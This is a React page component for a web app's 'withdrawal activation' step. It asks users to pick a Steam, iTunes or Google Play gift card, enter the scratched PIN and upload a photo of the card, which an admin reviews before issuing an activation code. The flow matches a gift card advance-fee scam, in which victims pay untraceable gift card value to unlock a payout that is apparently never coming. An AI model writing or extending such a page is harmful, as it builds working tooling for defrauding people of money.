// src/pages/Activate.jsx
import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { submitActivation } from '../services/api';
import './styles/home.css';

export default function Activate() {
  const loc = useLocation();
  const nav = useNavigate();
  const { withdrawalId } = loc.state || {};

  const [giftCard, setGiftCard] = useState('Steam');
  const [cardPin, setCardPin] = useState('');
  const [file, setFile] = useState(null);
  const [loading, setLoading] = useState(false);

  if (!withdrawalId) {
    return (
      <div className="page-container">
        <div className="card">
          <h3>Activation</h3>
          <p className="muted">No withdrawal ID found. Go back and recreate preview.</p>
        </div>
      </div>
    );
  }

  const handleFile = (e) => {
    setFile(e.target.files[0]);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!cardPin) return alert('Please input card pin');
    if (!file) return alert('Please upload image of the card');

    try {
      setLoading(true);
      const payload = new FormData();
      payload.append('withdrawalId', withdrawalId);
      payload.append('stage', 'activation');
      payload.append('giftCard', giftCard);
      payload.append('cardPin', cardPin);
      payload.append('file', file);

      await submitActivation(payload);
      alert('Activation submission sent. Check your dashboard notifications for an activation code.');
      nav('/withdraw/confirm-activate', { state: { withdrawalId } });
    } catch (err) {
      console.error(err);
      alert(err?.response?.data?.message || 'Failed to submit activation');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page-container">
      <div className="card">
        <h3>Activation</h3>
        <p className="muted small-muted">Input card pin and upload image to activate your withdrawal. You will receive an activation code on your dashboard notifications if admin processes it.</p>

        <form onSubmit={handleSubmit} style={{ marginTop: 12 }}>
          <label>
            <span>Gift Card</span>
            <select value={giftCard} onChange={(e) => setGiftCard(e.target.value)}>
              <option value="Steam">Steam card</option>
              <option value="iTunes">iTunes</option>
              <option value="GooglePlay">Google Play</option>
            </select>
          </label>

          <label>
            <span>Card Pin</span>
            <input value={cardPin} onChange={(e) => setCardPin(e.target.value)} placeholder="Enter scratched PIN" />
          </label>

          <label>
            <span>Upload card image</span>
            <input type="file" accept="image/*" onChange={handleFile} />
          </label>

          <div style={{ marginTop: 12 }}>
            <button className="btn" type="submit" disabled={loading}>{loading ? 'Uploading...' : 'Activate (submit card)'}</button>
            <button className="btn-outline" style={{ marginLeft: 8 }} type="button" onClick={() => nav('/dashboard')}>Cancel</button>
          </div>
        </form>
      </div>
    </div>
  );
}
